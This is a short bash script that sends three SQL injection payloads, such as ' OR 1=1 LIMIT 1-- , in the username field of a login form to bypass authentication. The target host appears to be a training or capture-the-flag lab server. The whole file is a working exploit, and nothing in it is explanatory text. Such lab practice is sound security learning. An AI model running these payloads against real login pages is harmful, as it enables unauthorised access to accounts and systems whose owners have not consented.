#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
for U in "' OR 1=1 LIMIT 1-- " "' OR 1=1 LIMIT 1#" "admin' OR 1=1 LIMIT 1-- "; do
  echo "=== username: $U ==="
  curl -s -m 20 -c /tmp/cj.txt -b /tmp/cj.txt -i --data-urlencode "username=$U" --data-urlencode "password=x" "$B/" | head -25
  echo
done
